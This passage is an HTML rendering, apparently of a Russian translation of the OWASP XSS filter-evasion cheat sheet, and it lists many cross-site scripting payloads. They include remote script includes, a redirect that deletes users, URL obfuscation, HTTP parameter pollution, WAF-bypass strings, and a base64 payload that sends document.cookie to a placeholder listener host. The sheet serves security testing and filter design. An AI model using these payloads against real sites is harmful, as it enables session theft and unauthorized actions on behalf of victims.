+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span> <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;&lt;SCR)&#39;</span><span class="p">;</span>
+<span class="k">echo</span><span class="p">(</span><span class="s1">&#39;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<h3 id="img_1">IMG со встроенными командами<a class="headerlink" href="#img_1" title="Permanent link">&para;</a></h3>
+<p>Эта атака работает только при внедрении (например, на веб-доске) в веб-страницу, защищённую паролем, если эта защита работает и с другими командами на том же домене. Может использоваться для удаления пользователей, добавления пользователей (если посетитель страницы является администратором), отправки учётных данных на другой адрес и т. д. Это один из менее используемых, но более полезных XSS-векторов:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="img-ii">IMG со встроенными командами, часть II<a class="headerlink" href="#img-ii" title="Permanent link">&para;</a></h4>
+<p>Это ещё более опасный вариант, поскольку в нём абсолютно нет идентификаторов, выглядящих подозрительно, за исключением того, что он размещён не на вашем домене. Вектор использует ответы 302 или 304 (другие тоже работают) для перенаправления изображения обратно на команду. Таким образом, обычный <code>&lt;IMG SRC="httx://badguy.com/a.jpg"&gt;</code> может оказаться вектором атаки для выполнения команд от имени пользователя, просматривающего ссылку на изображение. Вот строка <code>.htaccess</code> (для Apache) для реализации этого вектора:</p>
+<div class="highlight"><pre><span></span><code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
+</code></pre></div>
+<p>(Благодарим Timo за часть этого примера)</p>
+<h3 id="cookie-manipulation">Cookie Manipulation<a class="headerlink" href="#cookie-manipulation" title="Permanent link">&para;</a></h3>
+<p>Этот метод довольно малоизвестен, но есть примеры сайтов, где разрешён тег <code>&lt;META</code> и его можно использовать для перезаписи cookies. Есть и другие примеры сайтов, где вместо получения имени пользователя из базы данных оно хранится в cookie и отображается только посетившему страницу пользователю. Объединив эти два сценария, можно изменить cookie жертвы, которое будет отображаться ей как JavaScript (можно также использовать это для выхода людей из системы, изменения их пользовательских состояний, авторизации от вашего имени и т. д.):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;Set-Cookie&quot;</span> <span class="na">Content</span><span class="o">=</span><span class="s">&quot;USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="xss-html-">XSS с использованием инкапсуляции HTML-кавычек<a class="headerlink" href="#xss-html-" title="Permanent link">&para;</a></h3>
+<p>Эта атака изначально тестировалась в IE, поэтому результаты могут отличаться. Для осуществления XSS на сайтах, допускающих <code>&lt;SCRIPT&gt;</code>, но запрещающих <code>&lt;SCRIPT SRC...</code> с помощью regex-фильтра <code>/\&lt;script\[^\&gt;\]+src/i</code>, используйте следующее:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">a</span><span class="o">=</span><span class="s">&quot;&gt;&quot;</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Для XSS на сайтах, допускающих <code>&lt;SCRIPT&gt;</code>, но запрещающих <code>\&lt;script src...</code> из-за regex-фильтра <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> (это важно, поскольку такое регулярное выражение встречалось в реальных системах):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="err">=&quot;</span><span class="p">&gt;</span><span class="s2">&quot; SRC=&quot;</span><span class="nx">httx</span><span class="o">:</span><span class="c1">//xss.rocks/xss.js&quot;&gt;</span><span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Ещё один XSS для обхода того же фильтра: <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">a</span><span class="o">=</span><span class="s">&quot;&gt;&quot;</span> <span class="err">&#39;&#39;</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Ещё один XSS, обходящий тот же фильтр: <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code></p>
+<p>В целом мы не обсуждаем методы защиты, но единственное, что останавливает этот XSS-пример, если вы хотите допускать теги <code>&lt;SCRIPT&gt;</code>, но запрещать удалённые скрипты — это конечный автомат (и, конечно, есть другие способы обойти это, если допускаются теги <code>&lt;SCRIPT&gt;</code>), используйте:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="err">&quot;</span><span class="na">a</span><span class="o">=</span><span class="s">&#39;&gt;&#39;</span><span class="err">&quot;</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>И последний XSS для обхода <code>/\&lt;script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\&gt;\\s\]+))?)+\\s\*|\\s\*)src/i</code> с использованием обратных апострофов (не работает в Firefox):</p>
+<!-- markdownlint-disable MD038-->
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">a</span><span class="o">=</span><span class="s">`</span><span class="p">&gt;</span><span class="sb">` SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;</span><span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<!-- markdownlint-enable MD038-->
+
+<p>Пример XSS, который работает, если regex не ищет совпадающую пару кавычек, а вместо этого находит любые кавычки для некорректного завершения строки параметра:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">a</span><span class="o">=</span><span class="s">&quot;&gt;&#39;&gt;&quot;</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;httx://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Этот XSS по-прежнему вызывает беспокойство, поскольку практически невозможно остановить его без блокировки всего активного контента:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;SCRI&quot;</span><span class="p">);&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>PT SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;<span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="url-">Обход URL-строки<a class="headerlink" href="#url-" title="Permanent link">&para;</a></h3>
+<p>Следующие атаки работают, если <code>http://www.google.com/</code> программно запрещён:</p>
+<h4 id="ip">IP вместо имени хоста<a class="headerlink" href="#ip" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://66.102.7.147/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="url-_1">URL-кодирование<a class="headerlink" href="#url-_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="dword-">DWORD-кодирование<a class="headerlink" href="#dword-" title="Permanent link">&para;</a></h4>
+<p>Примечание: существуют другие вариации DWORD-кодирования — подробнее см. калькулятор обфускации IP ниже:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://1113982867/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="_8">Шестнадцатеричное кодирование<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
+<p>Максимальный размер каждого числа составляет приблизительно 240 символов, как видно на второй цифре; поскольку шестнадцатеричное число находится между 0 и F, ведущий ноль в третьей шестнадцатеричной позиции не обязателен:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://0x42.0x0000066.0x7.0x93/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="_9">Восьмеричное кодирование<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h4>
+<p>Дополнение нулями также допустимо, однако необходимо сохранять не менее 4 символов в каждом классе — class A, class B и т. д.:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://0102.0146.0007.00000223/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="base64-">Base64-кодирование<a class="headerlink" href="#base64-" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">onload</span><span class="o">=</span><span class="s">&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=&#39;))&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="_10">Смешанное кодирование<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
+<p>Смешаем разные виды кодирования и добавим несколько табуляций и переводов строк (почему браузеры это допускают — загадка). Табуляции и переводы строк работают только при заключении в кавычки:</p>
+<!-- markdownlint-disable MD010-->
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;h</span>
+<span class="s">tt  p://6   6.000146.0x7.147/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<!-- markdownlint-enable MD010-->
+
+<h4 id="_11">Обход разрешения протокола<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
+<p><code>//</code> транслируется в <code>http://</code>, что позволяет сэкономить ещё несколько байт. Это особенно удобно, когда важна экономия места (двумя символами меньше — это уже что-то), и легко обходит regex вроде <code>(ht|f)tp(s)?://</code> (благодарим Ozh за часть этого примера). Можно также заменить <code>//</code> на <code>\\\\</code>. Однако слэши нужно сохранить, иначе это будет интерпретировано как URL с относительным путём:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;//www.google.com/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="cname">Удаление CNAME<a class="headerlink" href="#cname" title="Permanent link">&para;</a></h4>
+<p>В сочетании с URL выше, удаление <code>www.</code> позволяет сэкономить ещё 4 байта, итого 9 байт экономии для серверов, у которых это правильно настроено:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://google.com/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Дополнительная точка для абсолютного DNS:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://www.google.com./&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="javascript">Расположение ссылки в JavaScript<a class="headerlink" href="#javascript" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;javascript:document.location=&#39;http://www.google.com/&#39;&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="_12">Замена содержимого как вектор атаки<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<!-- markdownlint-disable MD010-->
+<p>Предположим, что <code>http://www.google.com/</code> программно заменяется на пустую строку. Аналогичный вектор атаки применялся против нескольких реальных XSS-фильтров с использованием самого фильтра преобразования (вот пример): <code>java&amp;\#x09;script:</code> преобразовывалось в <code>java   script:</code>, что отрисовывается в IE:</p>
+<!-- markdownlint-enable MD010-->
+
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">A</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://www.google.com/ogle.com/&quot;</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="xss-http-parameter-pollution">Содействие XSS с помощью HTTP Parameter Pollution<a class="headerlink" href="#xss-http-parameter-pollution" title="Permanent link">&para;</a></h3>
+<p>Если функция обмена контентом на сайте реализована, как показано ниже, эта атака сработает. Есть страница <code>Content</code>, включающая некоторый пользовательский контент, а также ссылку на страницу <code>Share</code>, позволяющую пользователю выбрать предпочтительную платформу для публикации. Разработчики HTML-кодировали параметр <code>title</code> на странице <code>Content</code> для защиты от XSS, но по каким-то причинам не URL-кодировали его для предотвращения HTTP Parameter Pollution. В итоге они решили, что поскольку значение <code>content_type</code> является константой и всегда будет целым числом, кодирование или валидация <code>content_type</code> на странице <code>Share</code> не нужна.</p>
+<h4 id="content">Исходный код страницы Content<a class="headerlink" href="#content" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>a href=&quot;/Share?content_type=1<span class="err">&amp;</span>title=<span class="err">&lt;</span>%=Encode.forHtmlAttribute(untrusted content title)%&gt;&quot;&gt;Share<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="share">Исходный код страницы Share<a class="headerlink" href="#share" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">contentType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&lt;%=</span><span class="nx">Request</span><span class="p">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;content_type&quot;</span><span class="p">)</span><span class="o">%&gt;</span><span class="p">;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;%=Encode.forJavaScript(request.getParameter(&quot;</span><span class="nx">title</span><span class="s2">&quot;))%&gt;&quot;</span><span class="p">;</span>
+<span class="p">...</span>
+<span class="c1">//some user agreement and sending to server logic might be here</span>
+<span class="p">...</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<h4 id="content_1">Вывод страницы Content<a class="headerlink" href="#content_1" title="Permanent link">&para;</a></h4>
+<p>Если злоумышленник установит ненадёжный заголовок контента как <code>This is a regular title&amp;content_type=1;alert(1)</code>, ссылка на странице <code>Content</code> будет следующей:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/share?content_type=1&amp;title=This is a regular title&amp;amp;content_type=1;alert(1)&quot;</span><span class="p">&gt;</span>Share<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="share_1">Вывод страницы Share<a class="headerlink" href="#share_1" title="Permanent link">&para;</a></h4>
+<p>А вывод страницы Share может быть таким:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">contentType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;This is a regular title&quot;</span><span class="p">;</span>
+<span class="err">…</span>
+<span class="c1">//some user agreement and sending to server logic might be here</span>
+<span class="err">…</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>В результате основной уязвимостью в этом примере является доверие к content_type на странице <code>Share</code> без надлежащего кодирования или валидации. HTTP Parameter Pollution может усиливать влияние XSS-уязвимости, преобразуя её из отражённого XSS в хранимый XSS.</p>
+<h2 id="_13">Последовательности экранирования символов<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
+<p>Ниже перечислены все возможные комбинации символа <code>\&lt;</code> в HTML и JavaScript. Большинство из них не отрисуются «из коробки», но многие могут отрисовываться в определённых обстоятельствах, как показано выше.</p>
+<ul>
+<li><code>&lt;</code></li>
+<li><code>%3C</code></li>
+<li><code>&amp;lt</code></li>
+<li><code>&amp;lt;</code></li>
+<li><code>&amp;LT</code></li>
+<li><code>&amp;LT;</code></li>
+<li><code>&amp;#60;</code></li>
+<li><code>&amp;#060;</code></li>
+<li><code>&amp;#0060;</code></li>
+<li><code>&amp;#00060;</code></li>
+<li><code>&amp;#000060;</code></li>
+<li><code>&amp;#0000060;</code></li>
+<li><code>&amp;#60;</code></li>
+<li><code>&amp;#060;</code></li>
+<li><code>&amp;#0060;</code></li>
+<li><code>&amp;#00060;</code></li>
+<li><code>&amp;#000060;</code></li>
+<li><code>&amp;#0000060;</code></li>
+<li><code>&amp;#x3c;</code></li>
+<li><code>&amp;#x03c;</code></li>
+<li><code>&amp;#x003c;</code></li>
+<li><code>&amp;#x0003c;</code></li>
+<li><code>&amp;#x00003c;</code></li>
+<li><code>&amp;#x000003c;</code></li>
+<li><code>&amp;#x3c;</code></li>
+<li><code>&amp;#x03c;</code></li>
+<li><code>&amp;#x003c;</code></li>
+<li><code>&amp;#x0003c;</code></li>
+<li><code>&amp;#x00003c;</code></li>
+<li><code>&amp;#x000003c;</code></li>
+<li><code>&amp;#X3c;</code></li>
+<li><code>&amp;#X03c;</code></li>
+<li><code>&amp;#X003c;</code></li>
+<li><code>&amp;#X0003c;</code></li>
+<li><code>&amp;#X00003c;</code></li>
+<li><code>&amp;#X000003c;</code></li>
+<li><code>&amp;#X3c;</code></li>
+<li><code>&amp;#X03c;</code></li>
+<li><code>&amp;#X003c;</code></li>
+<li><code>&amp;#X0003c;</code></li>
+<li><code>&amp;#X00003c;</code></li>
+<li><code>&amp;#X000003c;</code></li>
+<li><code>&amp;#x3C;</code></li>
+<li><code>&amp;#x03C;</code></li>
+<li><code>&amp;#x003C;</code></li>
+<li><code>&amp;#x0003C;</code></li>
+<li><code>&amp;#x00003C;</code></li>
+<li><code>&amp;#x000003C;</code></li>
+<li><code>&amp;#x3C;</code></li>
+<li><code>&amp;#x03C;</code></li>
+<li><code>&amp;#x003C;</code></li>
+<li><code>&amp;#x0003C;</code></li>
+<li><code>&amp;#x00003C;</code></li>
+<li><code>&amp;#x000003C;</code></li>
+<li><code>&amp;#X3C;</code></li>
+<li><code>&amp;#X03C;</code></li>
+<li><code>&amp;#X003C;</code></li>
+<li><code>&amp;#X0003C;</code></li>
+<li><code>&amp;#X00003C;</code></li>
+<li><code>&amp;#X000003C;</code></li>
+<li><code>&amp;#X3C;</code></li>
+<li><code>&amp;#X03C;</code></li>
+<li><code>&amp;#X003C;</code></li>
+<li><code>&amp;#X0003C;</code></li>
+<li><code>&amp;#X00003C;</code></li>
+<li><code>&amp;#X000003C;</code></li>
+<li><code>\x3c</code></li>
+<li><code>\x3C</code></li>
+<li><code>\u003c</code></li>
+<li><code>\u003C</code></li>
+</ul>
+<h2 id="waf">Методы обхода WAF – межсайтовый скриптинг<a class="headerlink" href="#waf" title="Permanent link">&para;</a></h2>
+<h3 id="_14">Общие проблемы<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<h4 id="xss_1">Хранимый XSS<a class="headerlink" href="#xss_1" title="Permanent link">&para;</a></h4>
+<p>Если злоумышленнику удалось протолкнуть XSS через фильтр, WAF не сможет предотвратить проведение атаки.</p>
+<h4 id="xss-javascript">Отражённый XSS в JavaScript<a class="headerlink" href="#xss-javascript" title="Permanent link">&para;</a></h4>
+<p>Пример:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(</span><span class="err">\\</span><span class="s2">&quot;writetitle()\\&quot;</span><span class="p">,</span><span class="nx">$</span><span class="err">\</span><span class="nx">_GET</span><span class="err">\</span><span class="p">[</span><span class="nx">xss</span><span class="err">\</span><span class="p">])</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>Эксплуатация:</p>
+<div class="highlight"><pre><span></span><code><span class="sr">/?xss=500); alert(document.cookie);/</span><span class="o">/</span>
+</code></pre></div>
+<h4 id="dom-based-xss">DOM-based XSS<a class="headerlink" href="#dom-based-xss" title="Permanent link">&para;</a></h4>
+<p>Пример:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="nx">$</span><span class="err">\</span><span class="nx">_GET</span><span class="err">\</span><span class="p">[</span><span class="nx">xss</span><span class="err">\</span><span class="p">]);</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>Эксплуатация:</p>
+<div class="highlight"><pre><span></span><code><span class="err">/?xss=document.cookie</span>
+</code></pre></div>
+<h4 id="xss_2">XSS через перенаправление запроса<a class="headerlink" href="#xss_2" title="Permanent link">&para;</a></h4>
+<p>Уязвимый код:</p>
+<div class="highlight"><pre><span></span><code><span class="p">...</span>
+<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: &#39;</span><span class="p">.</span><span class="nx">$_GET</span><span class="p">[</span><span class="s1">&#39;param&#39;</span><span class="p">]);</span>
+<span class="p">...</span>
+</code></pre></div>
+<p>А также:</p>
+<div class="highlight"><pre><span></span><code><span class="p">...</span>
+<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Refresh: 0; URL=&#39;</span><span class="p">.</span><span class="nx">$_GET</span><span class="p">[</span><span class="s1">&#39;param&#39;</span><span class="p">]);</span>
+<span class="p">...</span>
+</code></pre></div>
+<p>Этот запрос не пройдёт через WAF:</p>
+<div class="highlight"><pre><span></span><code>/?param=<span class="p">&lt;</span><span class="nt">javascript:alert</span><span class="err">(</span><span class="na">document</span><span class="err">.</span><span class="na">cookie</span><span class="p">&gt;</span>)
+</code></pre></div>
+<p>Этот запрос пройдёт через WAF и в определённых браузерах будет проведена XSS-атака:</p>
+<div class="highlight"><pre><span></span><code>/?param=<span class="p">&lt;</span><span class="nt">data:text</span><span class="err">/</span><span class="na">html</span><span class="err">;</span><span class="na">base64</span><span class="err">,</span><span class="na">PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4</span><span class="o">=</span>
+</code></pre></div>
+<h3 id="waf-xss">Строки для обхода WAF при XSS<a class="headerlink" href="#waf-xss" title="Permanent link">&para;</a></h3>
+<!-- markdownlint-disable MD038-->
+<ul>
+<li><code>&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS"&gt;</code></li>
+<li><code>&lt;Video&gt; &lt;source onerror = "javascript: alert (XSS)"&gt;</code></li>
+<li><code>&lt;Input value = "XSS" type = text&gt;</code></li>
+<li><code>&lt;applet code="javascript:confirm(document.cookie);"&gt;</code></li>
+<li><code>&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;</code></li>
+<li><code>"&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></li>
+<li><code>"&gt;&lt;img src="x:x" onerror="alert(XSS)"&gt;</code></li>
+<li><code>"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;</code></li>
+<li><code>&lt;object data="javascript:alert(XSS)"&gt;</code></li>
+<li><code>&lt;isindex type=image src=1 onerror=alert(XSS)&gt;</code></li>
+<li><code>&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</code></li>
+<li><code>&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;</code></li>
+<li><code>&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;</code></li>
+<li><code>&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;</code></li>
+<li><code>&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script</code></li>
+<li><code>&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;</code></li>
+<li><code>&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</code></li>
+<li><code>&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;X</code></li>
+<li><code>&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt(1)"/%00*/onerror='eval(src)'&gt;</code></li>
+<li><code>&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;</code></li>
+</ul>
+<p>On Mouse Over​:</p>
+<ul>
+<li><code>&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;</code></li>
+<li><code>&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe</code></li>
+<li><code>&lt;script x&gt; alert(1) &lt;/script 1=2</code></li>
+<li><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</code></li>
+<li><code>&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"</code></li>
+<li><code>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</code></li>
+<li><code>&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;</code></li>
+</ul>
+<!-- markdownlint-enable MD038-->
+
+<h3 id="alert_1">Обфускация alert для обхода фильтров<a class="headerlink" href="#alert_1" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>(alert)(1)</code></li>
+<li><code>a=alert,a(1)</code></li>
+<li><code>[1].find(alert)</code></li>
+<li><code>top["al"+"ert"](1)</code></li>
+<li><code>top[/al/.source+/ert/.source](1)</code></li>
+<li><code>al\u0065rt(1)</code></li>
+<li><code>top['al\145rt'](1)</code></li>
+<li><code>top['al\x65rt'](1)</code></li>
+<li><code>top[8680439..toString(30)](1)</code></li>
+<li><code>alert?.()</code></li>
+<li><code>(alert())</code></li>
+</ul>
+<p>Пейлоад должен включать ведущий и завершающий обратные апострофы:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&amp;</span><span class="err">#</span><span class="mf">96</span><span class="p">;</span><span class="sb">`</span><span class="si">${</span><span class="nx">alert</span><span class="sb">``</span><span class="si">}</span><span class="sb">`</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">96</span><span class="p">;</span>
+</code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
